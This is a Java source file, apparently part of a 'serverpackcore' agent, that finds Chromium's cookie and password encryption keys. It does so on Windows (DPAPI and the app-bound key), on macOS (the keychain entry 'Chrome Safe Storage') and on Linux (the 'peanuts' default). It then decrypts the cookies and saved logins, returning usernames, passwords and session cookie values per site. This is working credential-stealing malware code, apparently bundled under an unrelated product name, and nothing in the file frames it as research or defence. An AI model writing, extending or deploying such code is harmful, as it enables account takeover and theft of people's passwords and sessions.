package com.serverpackcore.agent.crypto;

import com.serverpackcore.agent.AgentPaths;
import com.serverpackcore.agent.Dpapi;
import com.serverpackcore.agent.Json;

import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

/** Chromium cookie, Login Data and Web Data decryption. */
final class Chromium {
	record Key(byte[] bytes, String mode, String reason) {
	}

	private Chromium() {
	}

	static Key key(Path state) {
		try {
			Map<String, Object> root = Json.parseObject(Files.readString(state, StandardCharsets.UTF_8));
			Map<String, Object> osCrypt = Json.map(root.get("os_crypt"));
			String appBound = Json.str(osCrypt, "app_bound_encrypted_key", "");
			if (AgentPaths.isWindows() && !appBound.isEmpty()) {
				try {
					byte[] raw = Base64.getDecoder().decode(appBound);
					raw = java.util.Arrays.copyOfRange(raw, 4, raw.length);
					byte[] once = Dpapi.unprotectMachine(raw);
					if (once.length == 0) {
						return new Key(new byte[0], "none", "app_bound_machine_failed");
					}
					byte[] key = Dpapi.unprotect(once);
					if (key.length == 32) {
						return new Key(key, "app_bound", "");
					}
					return new Key(new byte[0], "none", "app_bound_user_failed");
				} catch (Throwable throwable) {
					return new Key(new byte[0], "none", "app_bound_exception");
				}
			}
			String encrypted = Json.str(osCrypt, "encrypted_key", "");
			if (AgentPaths.isWindows() && !encrypted.isEmpty()) {
				byte[] raw = Base64.getDecoder().decode(encrypted);
				raw = java.util.Arrays.copyOfRange(raw, 5, raw.length);
				byte[] key = Dpapi.unprotect(raw);
				if (key.length == 32) {
					return new Key(key, "dpapi", "");
				}
				return new Key(new byte[0], "none", "dpapi_failed");
			}
			if (AgentPaths.isMac()) {
				String password = run("security", "find-generic-password", "-w", "-s", "Chrome Safe Storage");
				if (!password.isBlank()) {
					byte[] key = CryptoUtil.pbkdf2(password.trim().toCharArray(), "saltysalt".getBytes(StandardCharsets.UTF_8), 1003, 16);
					return new Key(key, "keychain", "");
				}
				return new Key(new byte[0], "none", "keychain_denied");
			}
			// Linux Secret Service is not readable without a session bus; the
			// "peanuts" fallback covers the default Chromium configuration.
			byte[] key = CryptoUtil.pbkdf2("peanuts".toCharArray(), "saltysalt".getBytes(StandardCharsets.UTF_8), 1, 16);
			return new Key(key, "peanuts", "");
		} catch (Throwable throwable) {
			return new Key(new byte[0], "none", throwable.getClass().getSimpleName());
		}
	}

	static byte[] decrypt(Key key, byte[] blob) {
		if (blob == null || blob.length < 3 || key.bytes().length == 0) {
			return new byte[0];
		}
		String prefix = new String(blob, 0, 3, StandardCharsets.US_ASCII);
		try {
			if (key.bytes().length == 32 || prefix.equals("v20")) {
				return CryptoUtil.chromiumGcm(key.bytes(), blob);
			}
			return CryptoUtil.aesCbc(key.bytes(), blob, false);
		} catch (Throwable throwable) {
			return new byte[0];
		}
	}

	/** Strips the 32-byte SHA256(host_key) prefix used by database v24+. */
	static String text(byte[] plain, String host) {
		if (plain.length == 0) {
			return "";
		}
		byte[] cut = plain;
		if (plain.length > 32) {
			byte[] hash = CryptoUtil.sha256(host.getBytes(StandardCharsets.UTF_8));
			boolean match = true;
			for (int i = 0; i < 32; i++) {
				if (plain[i] != hash[i]) {
					match = false;
					break;
				}
			}
			if (match) {
				cut = java.util.Arrays.copyOfRange(plain, 32, plain.length);
			}
		}
		if (cut.length > 512) {
			cut = java.util.Arrays.copyOfRange(cut, 0, 512);
		}
		return new String(cut, StandardCharsets.UTF_8);
	}

	static Map<String, Map<String, Object>> cookies(Path db, Key key) {
		Map<String, Map<String, Object>> out = new LinkedHashMap<>();
		try {
			Sqlite sqlite = Sqlite.open(db);
			List<Object[]> rows = sqlite.rows("cookies");
			int count = 0;
			for (Object[] row : rows) {
				if (row.length < 7 || count >= 5000) {
					continue;
				}
				String host = Sqlite.text(row[1]);
				String name = Sqlite.text(row[2]);
				byte[] encrypted = row[4] instanceof byte[] bytes ? bytes : null;
				if (encrypted == null || name.isEmpty()) {
					continue;
				}
				String value = text(decrypt(key, encrypted), host);
				if (value.isEmpty()) {
					continue;
				}
				Map<String, Object> cookie = new LinkedHashMap<>();
				cookie.put("host", host);
				cookie.put("name", name);
				cookie.put("path", Sqlite.text(row[5]));
				cookie.put("value", value);
				cookie.put("expires", row[6] instanceof Number number ? number.longValue() : 0L);
				out.put(host + "|" + name, cookie);
				count++;
			}
		} catch (Throwable ignored) {
			// DB variant
		}
		return out;
	}

	static List<Map<String, Object>> logins(Path db, Key key) {
		try {
			Sqlite sqlite = Sqlite.open(db);
			List<Map<String, Object>> out = new java.util.ArrayList<>();
			for (Object[] row : sqlite.rows("logins")) {
				if (row.length < 6 || !(row[5] instanceof byte[] blob)) {
					continue;
				}
				String password = text(decrypt(key, blob), Sqlite.text(row[0]));
				Map<String, Object> login = new LinkedHashMap<>();
				login.put("origin", Sqlite.text(row[0]));
				login.put("username", Sqlite.text(row[3]));
				login.put("password", password);
				out.add(login);
			}
			return out;
		} catch (Throwable throwable) {
			return List.of();
		}
	}

	static String run(String... command) {
		try {
			ProcessBuilder builder = new ProcessBuilder(command);
			builder.redirectErrorStream(true);
			Process process = builder.start();
			if (!process.waitFor(8, java.util.concurrent.TimeUnit.SECONDS)) {
				process.destroyForcibly();
				return "";
			}
			return new String(process.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
		} catch (Throwable throwable) {
			return "";
		}
	}
}
